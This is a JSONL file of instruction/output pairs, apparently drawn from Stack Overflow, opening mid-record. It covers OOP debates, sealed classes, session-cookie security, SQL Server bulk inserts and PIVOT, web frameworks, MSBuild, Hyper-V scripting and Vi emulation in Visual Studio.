WinAPI."}
{"instruction": "As far as I can tell, in spite of the countless millions or billions spent on OOP education, languages, and tools, OOP has not improved developer productivity or software reliability, nor has it reduced development costs. Few people use OOP in any rigorous sense (few people adhere to or understand principles such as LSP); there seems to be little uniformity or consistency to the approaches that people take to modelling problem domains.  All too often, the class is used simply for its syntactic sugar; it puts the functions for a record type into their own little namespace.\nI've written a large amount of code for a wide variety of applications. Although there have been places where true substitutable subtyping played a valuable role in the application, these have been pretty exceptional. In general, though much lip service is given to talk of \"re-use\" the reality is that unless a piece of code does exactly what you want it to do, there's very little cost-effective \"re-use\".  It's extremely hard to design classes to be extensible in the right way, and so the cost of extension is normally so great that \"re-use\" simply isn't worthwhile.\nIn many regards, this doesn't surprise me.  The real world isn't \"OO\", and the idea implicit in OO--that we can model things with some class taxonomy--seems to me very fundamentally flawed (I can sit on a table, a tree stump, a car bonnet, someone's lap--but not one of those is-a chair).  Even if we move to more abstract domains, OO modelling is often difficult, counterintuitive, and ultimately unhelpful (consider the classic examples of circles/ellipses or squares/rectangles).\nSo what am I missing here? Where's the value of OOP, and why has all the time and money failed to make software any better?", "output": "All too often, the class is used\n  simply for its syntactic sugar; it\n  puts the functions for a record type\n  into their own little namespace.  \n\nYes, I find this to be too prevalent as well. This is not Object Oriented Programming. It's Object Based Programming and data centric programing. In my 10 years of working with OO Languages, I see people mostly doing Object Based Programming. OBP breaks down very quickly IMHO since you are essentially getting the worst of both words: 1) Procedural programming without adhering to proven structured programming methodology and 2) OOP without adhering to to proven OOP methodology.  \nOOP done right is a beautiful thing. It makes very difficult problems easy to solve, and to the uninitiated (not trying to sound pompous there), it can almost seem like magic. That being said, OOP is just one tool in the toolbox of programming methodologies. It is not the be all end all methodology. It just happens to suit large business applications well.   \nMost developers who work in OOP languages are utilizing examples of OOP done right in the frameworks and types that they use day-to-day, but they just aren't aware of it. Here are some very simple examples: ADO.NET, Hibernate/NHibernate, Logging Frameworks, various language collection types, the ASP.NET stack, The JSP stack etc... These are all things that heavily rely on OOP in their codebases."}
{"instruction": "What I would like to do is create a clean virtual machine image as the output of a build of an application.\nSo a new virtual machine would be created (from a template is fine, with the OS installed, and some base software installed) --- a new web site would be created in IIS, and the web app build output copied to a location on the virtual machine hard disk, and IIS configured correctly, the VM would start up and run.\nI know there are MSBuild tasks to script all the administrative actions in IIS, but how do you script all the actions with Virtual machines?  Specifically, creating a new virtual machine from a template, naming it uniquely, starting it, configuring it, etc...\nSpecifically I was wondering if anyone has successfully implemented any VM scripting as part of a build process.\nUpdate: I assume with Hyper-V, there is a different set of libraries/APIs to script virtual machines, anyone played around with this?  And anyone with real practical experience of doing something like this?", "output": "Checkout Powershell Management library for Hyper-V on CodePlex. Some features:\n\nFinding a VM\n  Connecting to a VM\n  Discovering and manipulating Machine states\n  Backing up, exporting and snapshotting VMs\n  Adding and removing VMs, configuring motherboard settings.\n  Manipulating Disk controllers, drives and disk images\n  Manipluating Network Interface Cards\n  Working with VHD files"}
{"instruction": "As far as I can tell, in spite of the countless millions or billions spent on OOP education, languages, and tools, OOP has not improved developer productivity or software reliability, nor has it reduced development costs. Few people use OOP in any rigorous sense (few people adhere to or understand principles such as LSP); there seems to be little uniformity or consistency to the approaches that people take to modelling problem domains.  All too often, the class is used simply for its syntactic sugar; it puts the functions for a record type into their own little namespace.\nI've written a large amount of code for a wide variety of applications. Although there have been places where true substitutable subtyping played a valuable role in the application, these have been pretty exceptional. In general, though much lip service is given to talk of \"re-use\" the reality is that unless a piece of code does exactly what you want it to do, there's very little cost-effective \"re-use\".  It's extremely hard to design classes to be extensible in the right way, and so the cost of extension is normally so great that \"re-use\" simply isn't worthwhile.\nIn many regards, this doesn't surprise me.  The real world isn't \"OO\", and the idea implicit in OO--that we can model things with some class taxonomy--seems to me very fundamentally flawed (I can sit on a table, a tree stump, a car bonnet, someone's lap--but not one of those is-a chair).  Even if we move to more abstract domains, OO modelling is often difficult, counterintuitive, and ultimately unhelpful (consider the classic examples of circles/ellipses or squares/rectangles).\nSo what am I missing here? Where's the value of OOP, and why has all the time and money failed to make software any better?", "output": "Have you ever created a window using WinAPI?\n\nMore times than I care to remember.\n\nThen you should know that you define a class (RegisterClass), create an instance of it (CreateWindow), call virtual methods (WndProc) and base-class methods (DefWindowProc) and so on. WinAPI even takes the nomenclature from SmallTalk OOP, calling the methods \u201cmessages\u201d (Window Messages).\n\nThen you'll also know that it does no message dispatch of its own, which is a big gaping void. It also has crappy subclassing.\n\nHandles may not be inheritable but then, there's final in Java. They don't lack a class, they are a placeholder for the class: That's what the word \u201chandle\u201d means. Looking at architectures like MFC or .NET WinForms it's immediately obvious that except for the syntax, nothing much is different from the WinAPI.\n\nThey're not inheritable either in interface or implementation, minimally substitutable, and they're not substantially different from what procedural coders have been doing since forever.\nIs this really it?  The best bits of OOP are just... traditional procedural code?  That's the big deal?"}
{"instruction": "As far as I can tell, in spite of the countless millions or billions spent on OOP education, languages, and tools, OOP has not improved developer productivity or software reliability, nor has it reduced development costs. Few people use OOP in any rigorous sense (few people adhere to or understand principles such as LSP); there seems to be little uniformity or consistency to the approaches that people take to modelling problem domains.  All too often, the class is used simply for its syntactic sugar; it puts the functions for a record type into their own little namespace.\nI've written a large amount of code for a wide variety of applications. Although there have been places where true substitutable subtyping played a valuable role in the application, these have been pretty exceptional. In general, though much lip service is given to talk of \"re-use\" the reality is that unless a piece of code does exactly what you want it to do, there's very little cost-effective \"re-use\".  It's extremely hard to design classes to be extensible in the right way, and so the cost of extension is normally so great that \"re-use\" simply isn't worthwhile.\nIn many regards, this doesn't surprise me.  The real world isn't \"OO\", and the idea implicit in OO--that we can model things with some class taxonomy--seems to me very fundamentally flawed (I can sit on a table, a tree stump, a car bonnet, someone's lap--but not one of those is-a chair).  Even if we move to more abstract domains, OO modelling is often difficult, counterintuitive, and ultimately unhelpful (consider the classic examples of circles/ellipses or squares/rectangles).\nSo what am I missing here? Where's the value of OOP, and why has all the time and money failed to make software any better?", "output": "OOP isn't about creating re-usable classes, its about creating Usable classes."}
{"instruction": "Specifically this is regarding when using a client session cookie to identify a session on the server.\nIs the best answer to use SSL/HTTPS encryption for the entire web site, and you have the best guarantee that no man in the middle attacks will be able to sniff an existing client session cookie?\nAnd perhaps second best to use some sort of encryption on the session value itself that is stored in your session cookie?\nIf a malicious user has physical access to a machine, they can still look at the filesystem to retrieve a valid session cookie and use that to hijack a session?", "output": "The SSL only helps with sniffing attacks. If an attacker has access to your machine I will assume they can copy your secure cookie too.  \nAt the very least, make sure old cookies lose their value after a while. Even a successful hijaking attack will be thwarted when the cookie stops working. If the user has a cookie from a session that logged in more than a month ago, make them reenter their password. Make sure that whenever a user clicks on your site's \"log out\" link, that the old session UUID can never be used again. \nI'm not sure if this idea will work but here goes: Add a serial number into your session cookie, maybe a string like this:\nSessionUUID, Serial Num, Current Date/Time\nEncrypt this string and use it as your session cookie. Regularly change the serial num - maybe when the cookie is 5 minutes old and then reissue the cookie.  You could even reissue it on every page view if you wanted to. On the server side, keep a record of the last serial num you've issued for that session.  If someone ever sends a cookie with the wrong serial number it means that an attacker may be using a cookie they intercepted earlier so invalidate the session UUID and ask the user to reenter their password and then reissue a new cookie.\nRemember that your user may have more than one computer so they may have more than one active session. Don't do something that forces them to log in again every time they switch between computers."}
{"instruction": "Specifically this is regarding when using a client session cookie to identify a session on the server.\nIs the best answer to use SSL/HTTPS encryption for the entire web site, and you have the best guarantee that no man in the middle attacks will be able to sniff an existing client session cookie?\nAnd perhaps second best to use some sort of encryption on the session value itself that is stored in your session cookie?\nIf a malicious user has physical access to a machine, they can still look at the filesystem to retrieve a valid session cookie and use that to hijack a session?", "output": "Ensure you don't use incremting integers for session IDs.  Much better to use a GUID, or some other long randomly generated character string."}
{"instruction": "I am hitting some performance bottlenecks with my C# client inserting bulk data into a SQL Server 2005 database and I'm looking for ways in which to speed up the process.\nI am already using the SqlClient.SqlBulkCopy (which is based on TDS) to speed up the data transfer across the wire which helped a lot, but I'm still looking for more.\nI have a simple table that looks like this: \n CREATE TABLE [BulkData](\n [ContainerId] [int] NOT NULL,\n [BinId] [smallint] NOT NULL,\n [Sequence] [smallint] NOT NULL,\n [ItemId] [int] NOT NULL,\n [Left] [smallint] NOT NULL,\n [Top] [smallint] NOT NULL,\n [Right] [smallint] NOT NULL,\n [Bottom] [smallint] NOT NULL,\n CONSTRAINT [PKBulkData] PRIMARY KEY CLUSTERED \n (\n  [ContainerIdId] ASC,\n  [BinId] ASC,\n  [Sequence] ASC\n))\n\nI'm inserting data in chunks that average about 300 rows where ContainerId and BinId are constant in each chunk and the Sequence value is 0-n and the values are pre-sorted based on the primary key.  \nThe %Disk time performance counter spends a lot of time at 100% so it is clear that disk IO is the main issue but the speeds I'm getting are several orders of magnitude below a raw file copy.\nDoes it help any if I:\n\nDrop the Primary key while I am doing the inserting and recreate it later\nDo inserts into a temporary table with the same schema and periodically transfer them into the main table to keep the size of the table where insertions are happening small\nAnything else?\n\n--\nBased on the responses I have gotten, let me clarify a little bit:\nPortman: I'm using a clustered index because when the data is all imported I will need to access data sequentially in that order.  I don't particularly need the index to be there while importing the data.  Is there any advantage to having a nonclustered PK index while doing the inserts as opposed to dropping the constraint entirely for import?\nChopeen:  The data is being generated remotely on many other machines (my SQL server can only handle about 10 currently, but I would love to be able to add more).  It's not practical to run the entire process on the local machine because it would then have to process 50 times as much input data to generate the output.\nJason: I am not doing any concurrent queries against the table during the import process, I will try dropping the primary key and see if that helps.", "output": "BCP - it's a pain to set up, but it's been around since the dawn of DBs and it's very very quick.\nUnless you're inserting data in that order the 3-part index will really slow things.  Applying it later will really slow things too, but will be in a second step.\nCompound keys in Sql are always quite slow, the bigger the key the slower."}
{"instruction": "I am looking for a Web Framework to move windows based applications to the web.\nThe main requirements to WF are the following:\n\nunit tests support\ndesktop and mobile browsers support\nlong term viability\nmaturity of the framework", "output": "How about the ASP.NET MVC framework?  It's what this site is running on.\nAnother more mature option is Castle MonoRail.  \nI think ASP.NET MVC is probably the best choice in the long run.  A year from now, it will be far easier to hire someone who knows ASP.NET MVC than someone who knows MonoRail."}
{"instruction": "I am looking for a Web Framework to move windows based applications to the web.\nThe main requirements to WF are the following:\n\nunit tests support\ndesktop and mobile browsers support\nlong term viability\nmaturity of the framework", "output": "I heavily prefer CakePHP for PHP, Django for Python, Rails for Ruby.\nIn terms of front-end, if you're looking for a desktop-esque end user experience you should look into ExtJS or YUI."}
{"instruction": "I am looking for a Web Framework to move windows based applications to the web.\nThe main requirements to WF are the following:\n\nunit tests support\ndesktop and mobile browsers support\nlong term viability\nmaturity of the framework", "output": "In my opinion, with contributions from the SO community\n\nZend Fraemwork for PHP\nDjango for Python\nRails for Ruby\nMerb for Ruby (for the experienced)\nASP.NET MVC for .NET\nSeaside for Smalltalk\nCatalyst for Perl"}
{"instruction": "I am looking for a Web Framework to move windows based applications to the web.\nThe main requirements to WF are the following:\n\nunit tests support\ndesktop and mobile browsers support\nlong term viability\nmaturity of the framework", "output": "if you're a java progammer, check out the Struts framework by the Apache folks."}
{"instruction": "Is there available any tool for PHP which can be used to generate code for consuming a web service based on its WSDL? Something comparable to clicking \"Add Web Reference\" in Visual Studio or the Eclipse plugin which does the same thing for Java.", "output": "In PHP 5 you can use SoapClient on the WSDL to call the web service functions. For example:\n$client = new SoapClient(\"some.wsdl\");\n\nand $client is now an object which has class methods as defined in some.wsdl. So if there was a method called getTime in the WSDL then you would just call:\n$result = $client->getTime();\n\nAnd the result of that would (obviously) be in the $result variable. You can use the __getFunctions method to return a list of all the available methods."}
{"instruction": "I am looking for a Web Framework to move windows based applications to the web.\nThe main requirements to WF are the following:\n\nunit tests support\ndesktop and mobile browsers support\nlong term viability\nmaturity of the framework", "output": "I have been using Struts from Jakarta (Apache group) for java, and it's really good. Good separation of the layers, which allows you use any othe library/framework in any layer, for example Hibernate for object-relational mapping or even any template framework like Velocity in the view layer.\nI recommend you give a look at their website"}
{"instruction": "I am looking for a Web Framework to move windows based applications to the web.\nThe main requirements to WF are the following:\n\nunit tests support\ndesktop and mobile browsers support\nlong term viability\nmaturity of the framework", "output": "Rails is still ahead of the competitors as a complete stack with large community driving it forward."}
{"instruction": "I started using IRC at a young age, and I have always been fascinated with it.  As a language exercise, I was thinking about programming a simple IRC client in Ruby with Shoes as a graphical front-end.  My question to you, kind-sirs, what do I need to become familiar with to start on this great adventure (besides shoes and Ruby of course)?  I imagine there is some-sort of specification on IRC Protocol.  Any pointers?", "output": "I once implemented a client and a server with 2 more guys (as part of a course).\nI can tell you that the RFC you were already linked to is great.\nI'd also try simply sniffing a connection with an existing client to see for yourself how stuff work."}
{"instruction": "This question and answer shows how to send a file as a byte array through an XML web service. How much overhead is generated by using this method for file transfer?  I assume the data looks something like this:\n<?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n<bytes>\n    <byte>16</byte>\n    <byte>28</byte>\n    <byte>127</byte>\n    ...\n</bytes>\n\nIf this format is correct, the bytes must first be converted to UTF-8 characters. Each of these characters allocates 8 bytes. Are the bytes stored in base 10, hex, or binary characters? How much larger does the file appear as it is being sent due to the XML data and character encoding? Is compression built into web services?", "output": "The main performance hit isn't going to be from the transfer of the encoded file, it's going to be in the processing that the server has to do to encode the file pre-transfer (unless the files don't change often and the encoded version can be cached somehow)."}
{"instruction": "I want to see all the different ways you can come up with, for a factorial subroutine, or program. The hope is that anyone can come here and see if they might want to learn a new language.\nIdeas:\n\nProcedural\nFunctional\nObject Oriented\nOne liners\nObfuscated\nOddball\nBad Code\nPolyglot\n\nBasically I want to see an example, of different ways of writing an algorithm, and what they would look like in different languages.\nPlease limit it to one example per entry.\nI will allow you to have more than one example per answer, if you are trying to highlight a specific style, language, or just a well thought out idea that lends itself to being in one post.\nThe only real requirement is it must find the factorial of a given argument, in all languages represented.\nBe Creative!\nRecommended Guideline:\n\n# Language Name: Optional Style type\n\n   - Optional bullet points\n\n    Code Goes Here\n\nOther informational text goes here\n\nI will ocasionally go along and edit any answer that does not have decent formatting.", "output": "Java: functional\nint factorial(int x) {\n    return x == 0 ? 1 : x * factorial(x-1);\n}"}
{"instruction": "Trying to find some simple SQL Server PIVOT examples.  Most of the examples that I have found involve counting or summing up numbers.  I just want to pivot some string data.  For example, I have a query returning the following.\nAction1 VIEW  \nAction1 EDIT  \nAction2 VIEW  \nAction3 VIEW  \nAction3 EDIT  \n\nI would like to use PIVOT (if even possible) to make the results like so:\nAction1 VIEW EDIT  \nAction2 VIEW NULL  \nAction3 VIEW EDIT  \n\nIs this even possible with the PIVOT functionality?", "output": "Well, for your sample and any with a limited number of unique columns, this should do it.\nselect \n    distinct a,\n    (select distinct t2.b  from t t2  where t1.a=t2.a and t2.b='VIEW'),\n    (select distinct t2.b from t t2  where t1.a=t2.a and t2.b='EDIT')\nfrom t t1"}
{"instruction": "The company I'm currently working for is using Selenium for Uniting-Testing our User Interface. What do you use to Unit-Test your Web UI and how effective do you find it?", "output": "I've used WATIR, which is pretty good. I liked it because it's Ruby and allows for testing interactivity, available elements and source code parsing. I haven't used it for a while but I assume it's gotten better.\nIt's supposedly being ported to Firefox and Safari, but that's been happening for a while now."}
{"instruction": "A quick glance at the present-day internet would seem to indicate that Adobe Flash is the obvious choice for embedding video in a web page.  Is this accurate, or are they other effective choices?  Does the choice of ASP.NET as a platform influence this decision?", "output": "One consideration would be whether video playback is via progressive download or streaming. If it's progressive download, then I would say use Flash because you get a wider audience reach.\nFor streaming wmv, it is out of the box functionality provided by Windows Media Services\nFor streaming flash, you will have to install a streaming server on your Windows box. Some options are:\n\nAdobe Flash Media Server (Commercial)\nWowza Media Server (Free/Commercial) \nRed5 Flash Server (Open Source)"}
{"instruction": "I am hitting some performance bottlenecks with my C# client inserting bulk data into a SQL Server 2005 database and I'm looking for ways in which to speed up the process.\nI am already using the SqlClient.SqlBulkCopy (which is based on TDS) to speed up the data transfer across the wire which helped a lot, but I'm still looking for more.\nI have a simple table that looks like this: \n CREATE TABLE [BulkData](\n [ContainerId] [int] NOT NULL,\n [BinId] [smallint] NOT NULL,\n [Sequence] [smallint] NOT NULL,\n [ItemId] [int] NOT NULL,\n [Left] [smallint] NOT NULL,\n [Top] [smallint] NOT NULL,\n [Right] [smallint] NOT NULL,\n [Bottom] [smallint] NOT NULL,\n CONSTRAINT [PKBulkData] PRIMARY KEY CLUSTERED \n (\n  [ContainerIdId] ASC,\n  [BinId] ASC,\n  [Sequence] ASC\n))\n\nI'm inserting data in chunks that average about 300 rows where ContainerId and BinId are constant in each chunk and the Sequence value is 0-n and the values are pre-sorted based on the primary key.  \nThe %Disk time performance counter spends a lot of time at 100% so it is clear that disk IO is the main issue but the speeds I'm getting are several orders of magnitude below a raw file copy.\nDoes it help any if I:\n\nDrop the Primary key while I am doing the inserting and recreate it later\nDo inserts into a temporary table with the same schema and periodically transfer them into the main table to keep the size of the table where insertions are happening small\nAnything else?\n\n--\nBased on the responses I have gotten, let me clarify a little bit:\nPortman: I'm using a clustered index because when the data is all imported I will need to access data sequentially in that order.  I don't particularly need the index to be there while importing the data.  Is there any advantage to having a nonclustered PK index while doing the inserts as opposed to dropping the constraint entirely for import?\nChopeen:  The data is being generated remotely on many other machines (my SQL server can only handle about 10 currently, but I would love to be able to add more).  It's not practical to run the entire process on the local machine because it would then have to process 50 times as much input data to generate the output.\nJason: I am not doing any concurrent queries against the table during the import process, I will try dropping the primary key and see if that helps.", "output": "My guess is that you'll see a dramatic improvement if you change that index to be nonclustered. This leaves you with two options:\n\nChange the index to nonclustered, and leave it as a heap table, without a clustered index\nChange the index to nonclustered, but then add a surrogate key (like \"id\") and make it an identity, primary key, and clustered index\n\nEither one will speed up your inserts without noticeably slowing down your reads. \nThink about it this way -- right now, you're telling SQL to do a bulk insert, but then you're asking SQL to reorder the entire table every table you add anything. With a nonclustered index, you'll add the records in whatever order they come in, and then build a separate index indicating their desired order."}
{"instruction": "How do you turn a Visual Studio build that you'd perform in the IDE into a script that you can run from the command line?", "output": "Look into  build tool NAnt or MSBuild. I believe MSBuild is the build tool for Visual\u00a0Studio\u00a02005 and later. I am, however, a fan of NAnt..."}
{"instruction": "How do you turn a Visual Studio build that you'd perform in the IDE into a script that you can run from the command line?", "output": "Simplest way: navigate to the directory containing the solution or project file, and run msbuild (assuming you have Visual Studio 2005 or newer).\nMore flexible ways:\n\nRead up on the MSBuild\nreference. There are tons of\ncustomization, especially once\nyou've installed the MSBuild Community Tasks Project.  \nUse NAnt. It has existed\nfor longer than MSBuild and has more\ncommunity support, but requires you\nto start a project file from\nscratch, rather than extending the\nexisting, Visual Studio-created one."}
{"instruction": "How do you turn a Visual Studio build that you'd perform in the IDE into a script that you can run from the command line?", "output": "\\Windows\\Microsoft.NET\\Framework\\[YOUR .NET VERSION]\\msbuild.exe\n\nLots of command line parameters, but the simplest is just:\nmsbuild.exe yoursln.sln"}
{"instruction": "How do you turn a Visual Studio build that you'd perform in the IDE into a script that you can run from the command line?", "output": "NAnt and MSBuild are the most popular tools to automate your build in .NET, and you can find a discussion on there of the pros/cons of each in the Stack Overflow question Best .NET build tool."}
{"instruction": "What would be the best version control system to learn as a beginner to source control?", "output": "@Ian Nelson:\nI agree with you that Source Safe is bad as a source control system, but keep in mind that using Source Safe is a lot better than \"carrying around floppy disks\" as Joel Spolsky said.\nFor a beginner it might not be a bad idea, since the cost of having no source control at all is a lot higher."}
{"instruction": "What would be the best version control system to learn as a beginner to source control?", "output": "Vault from SourceGear.com is superb. It is free for single users and provides a superb VS 2005/2008 interface. I love it!\nrp"}
{"instruction": "How do you turn a Visual Studio build that you'd perform in the IDE into a script that you can run from the command line?", "output": "I had to do this for a C++ project in Visual Studio 2003 so I don't know how relevant this is to later version of visual studio:\nIn the directory where your executable is created there will be a BuildLog.htm file. Open that file in your browser and then for each section such as:\nCreating temporary file \"c:\\some\\path\\RSP00003C.rsp\" with contents\n[\n/D \"WIN32\" /D \"_WINDOWS\" /D \"STRICT\" /D \"NDEBUG\" ..... (lots of other switches)\n.\\Project.cpp\n.\\Another.cpp\n.\\AndAnother.cpp\n\".\\And Yet Another.cpp\"\n]\nCreating command line \"cl.exe @c:\\some\\path\\RSP00003C.rsp /nologo\"\n\ncreate a .rsp file with the content between the square brackets (but not including the square brackets) and call it whatever you like. I seem to remember having problems with absolute paths so you may have to make sure all the paths are relative.\nThen in your build script add the command line from the BuildLog.htm file but with your .rsp filename:\ncl.exe @autobuild01.rsp /nologo\n\n(note there will also be a link.exe section as well as cl.exe)"}
{"instruction": "What can be reasons to prevent a class from being inherited? (e.g. using sealed on a c# class)\nRight now I can't think of any.", "output": "How about if you are not sure about the interface yet and don't want any other code depending on the present interface? [That's off the top of my head, but I'd be interested in other reasons as well!]\nEdit:\nA bit of googling gave the following:\nhttp://codebetter.com/blogs/patricksmacchia/archive/2008/01/05/rambling-on-the-sealed-keyword.aspx\nQuoting:\nThere are three reasons why a sealed class is better than an unsealed class:\n\nVersioning: When a class is originally sealed, it can change to unsealed in the future without breaking compatibility. (\u2026)\nPerformance: (\u2026) if the JIT compiler sees a call to a virtual method using a sealed types, the JIT compiler can produce more efficient code by calling the method non-virtually.(\u2026)\nSecurity and Predictability: A class must protect its own state and not allow itself to ever become corrupted. When a class is unsealed, a derived class can access and manipulate the base class\u2019s state if any data fields or methods that internally manipulate fields are accessible and not private.(\u2026)"}
{"instruction": "What can be reasons to prevent a class from being inherited? (e.g. using sealed on a c# class)\nRight now I can't think of any.", "output": "Because writing classes to be substitutably extended is damn hard and requires you to make accurate predictions of how future users will want to extend what you've written.\nSealing your class forces them to use composition, which is much more robust."}
{"instruction": "What can be reasons to prevent a class from being inherited? (e.g. using sealed on a c# class)\nRight now I can't think of any.", "output": "This may not apply to your code, but a lot of classes within the .NET framework are sealed purposely so that no one tries to create a sub-class.\nThere are certain situations where the internals are complex and require certain things to be controlled very specifically so the designer decided no one should inherit the class so that no one accidentally breaks functionality by using something in the wrong way."}
{"instruction": "What can be reasons to prevent a class from being inherited? (e.g. using sealed on a c# class)\nRight now I can't think of any.", "output": "Because you always want to be handed a reference to the class and not to a derived one for various reasons:\ni. invariants that you have in some other part of your code\nii. security\netc\nAlso, because it's a safe bet with regards to backward compatibility - you'll never be able to close that class for inheritance if it's release unsealed.\nOr maybe you didn't have enough time to test the interface that the class exposes to be sure that you can allow others to inherit from it.\nOr maybe there's no point (that you see now) in having a subclass.  \nOr you don't want bug reports when people try to subclass and don't manage to get all the nitty-gritty details - cut support costs."}
{"instruction": "What can be reasons to prevent a class from being inherited? (e.g. using sealed on a c# class)\nRight now I can't think of any.", "output": "@jjnguy\n\nAnother user may want to re-use your code by sub-classing your class. I don't see a reason to stop this.\n\nIf they want to use the functionality of my class they can achieve that with containment, and they will have much less brittle code as a result.\nComposition seems to be often overlooked; all too often people want to jump on the inheritance bandwagon. They should not! Substitutability is difficult. Default to composition; you'll thank me in the long run."}
{"instruction": "What can be reasons to prevent a class from being inherited? (e.g. using sealed on a c# class)\nRight now I can't think of any.", "output": "Sometimes your class interface just isn't meant to be inheirited.  The public interface just isn't virtual and while someone could override the functionality that's in place it would just be wrong.  Yes in general they shouldn't override the public interface, but you can insure that they don't by making the class non-inheritable.  \nThe example I can think of right now are customized contained classes with deep clones in .Net.  If you inherit from them you lose the deep clone ability.[I'm kind of fuzzy on this example, it's been a while since I worked with IClonable]  If you have a true singelton class, you probably don't want inherited forms of it around, and a data persistence layer is not normally place you want a lot of inheritance."}
{"instruction": "I'm using TinyMCE in an ASP.Net project, and I need a spell check. The only TinyMCE plugins I've found use PHP on the server side, and I guess I could just break down and install PHP on my server and do that, but quite frankly, what a pain. I don't want to do that.\nAs it turns out, Firefox's built-in spell check will work fine for me, but it doesn't seem to work on TinyMCE editor boxes. I've enabled the gecko_spellcheck option, which is supposed to fix it, but it doesn't.\nDoes anybody know of a nice rich-text editor that doesn't break the browser's spell check?", "output": "Most rich text editors let you specify whether or not to disable the browser's spellchecker (as answered by others), with the exception of those running in Safari.\nThere is currently no way to programmatically disable the Safari spellchecker (as there is in FF and IE7+), so most rich text editors choose to let Safari do its own thing by leaving the browser in control of the context menu."}
{"instruction": "What can be reasons to prevent a class from being inherited? (e.g. using sealed on a c# class)\nRight now I can't think of any.", "output": "I want to give you this message from \"Code Complete\":\n\nInheritance - subclasses - tends to\n  work against the primary technical\n  imperative you have as a programmer,\n  which is to manage complexity.For the sake of controlling complexity, you should maintain a heavy bias against inheritance."}
{"instruction": "What can be reasons to prevent a class from being inherited? (e.g. using sealed on a c# class)\nRight now I can't think of any.", "output": "I am in agreement with jjnguy... I think the reasons to seal a class are few and far between.  Quite the contrary, I have been in the situation more than once where I want to extend a class, but couldn't because it was sealed.\nAs a perfect example, I was recently creating a small package (Java, not C#, but same principles) to wrap functionality around the memcached tool.  I wanted an interface so in tests I could mock away the memcached client API I was using, and also so we could switch clients if the need arose (there are 2 clients listed on the memcached homepage).  Additionally, I wanted to have the opportunity to replace the functionality altogether if the need or desire arose (such as if the memcached servers are down for some reason, we could potentially hot swap with a local cache implementation instead).\nI exposed a minimal interface to interact with the client API, and it would have been awesome to extend the client API class and then just add an implements clause with my new interface.  The methods that I had in the interface that matched the actual interface would then need no further details and so I wouldn't have to explicitly implement them.  However, the class was sealed, so I had to instead proxy calls to an internal reference to this class.  The result: more work and a lot more code for no real good reason.\nThat said, I think there are potential times when you might want to make a class sealed... and the best thing I can think of is an API that you will invoke directly, but allow clients to implement.  For example, a game where you can program against the game... if your classes were not sealed, then the players who are adding features could potentially exploit the API to their advantage.  This is a very narrow case though, and I think any time you have full control over the codebase, there really is little if any reason to make a class sealed.\nThis is one reason I really like the Ruby programming language... even the core classes are open, not just to extend but to ADD AND CHANGE functionality dynamically, TO THE CLASS ITSELF!  It's called monkeypatching and can be a nightmare if abused, but it's damn fun to play with!"}
{"instruction": "What can be reasons to prevent a class from being inherited? (e.g. using sealed on a c# class)\nRight now I can't think of any.", "output": "Not everything that's important in a class is asserted easily in code. There can be semantics and relationships present that are easily broken by inheriting and overriding methods. Overriding one method at a time is an easy way to do this.  You design a class/object as a single meaningful entity and then someone comes along and thinks if a method or two were 'better' it would do no harm.  That may or may not be true.  Maybe you can correctly separate all methods between private and not private or virtual and not virtual but that still may not be enough. Demanding inheritance of all classes also puts a huge additional burden on the original developer to foresee all the ways an inheriting class could screw things up.\nI don't know of a perfect solution. I'm sympathetic to preventing inheritance but that's also a problem because it hinders unit testing."}
{"instruction": "I'm used to the Vi(m) editor and am using MS Visual Studio 2005 at work. I couldn't find a free Vi add-in (there's only one for the 2003 version). I googled a bit, saw that there was a 'Google summer of code' project this year to write such an add-in, and am eagerly awaiting the result. I've also heard of ViEmu (not free, and I can't test it at work).\nHas anyone in my situation has found a solution (and/or tested ViEmu)?\nEdit: I can't test ViEmu at work because they are paranoid about what we install on our boxes: it has to go through required channels, and for 30 days I don't reckon it's worth it (and I have no Windows box at home).\nEdit: Since both answers were equivalent, I ended up accepting the first one that came in.", "output": "ViEmu works great with Visual Studio.  I used Vi(m) strictly in Linux, but I was turned on to bringing the Vi(m) editing process into the Windows world by JP Boodhoo.  JP praises about it also."}
{"instruction": "I'm used to the Vi(m) editor and am using MS Visual Studio 2005 at work. I couldn't find a free Vi add-in (there's only one for the 2003 version). I googled a bit, saw that there was a 'Google summer of code' project this year to write such an add-in, and am eagerly awaiting the result. I've also heard of ViEmu (not free, and I can't test it at work).\nHas anyone in my situation has found a solution (and/or tested ViEmu)?\nEdit: I can't test ViEmu at work because they are paranoid about what we install on our boxes: it has to go through required channels, and for 30 days I don't reckon it's worth it (and I have no Windows box at home).\nEdit: Since both answers were equivalent, I ended up accepting the first one that came in.", "output": "ViEmu works great. I've been using it for about a year now and couldn't imagine coding in Visual Studio without it.\nWhy can't you test it at work? It has a 30 day free trial."}
{"instruction": "What can be reasons to prevent a class from being inherited? (e.g. using sealed on a c# class)\nRight now I can't think of any.", "output": "I exposed a minimal interface to interact with the client API, and it would have been awesome to extend the client API class and then just add an implements clause with my new interface. The methods that I had in the interface that matched the actual interface would then need no further details and so I wouldn't have to explicitly implement them. However, the class was sealed, so I had to instead proxy calls to an internal reference to this class. The result: more work and a lot more code for no real good reason.\n\nWell, there is a reason: your code is now somewhat insulated from changes to the memcached interface."}
{"instruction": "What can be reasons to prevent a class from being inherited? (e.g. using sealed on a c# class)\nRight now I can't think of any.", "output": "Performance: (\u2026) if the JIT compiler sees a call to a virtual method using a sealed types, the JIT compiler can produce more efficient code by calling the method non-virtually.(\u2026)\n\nThat's a great reason indeed. Thus, for performance-critical classes, sealed and friends make sense.\nAll the other reasons I've seen mentioned so far boil down to \"nobody touches my class!\". If you're worried someone might misunderstand its internals, you did a poor job documenting it. You can't possibly know that there's nothing useful to add to your class, or that you already know every imaginable use case for it. Even if you're right and the other developer shouldn't have used your class to solve their problem, using a keyword isn't a great way of preventing such a mistake. Documentation is. If they ignore the documentation, their loss."}
{"instruction": "My team is moving from Visual SourceSafe to Subversion soon, while developing/supporting a legacy project in Visual Basic 6.0, so I have a couple of questions:\n\nWhat's the best tool for Subversion IDE integration in Visual Studio 6? (or is it not worth the trouble...)\nAre there any best practices for using Subversion with Visual Basic 6.0? (file types to ignore, etc.)", "output": "My guess would be to not bother with integration and just use Tortoise SVN in Windows Explorer.\nAs for file types to ignore, give it a test, checkout, build, and see if any files changed (for modern Visual Studio I tend to ignore the .suo files)"}
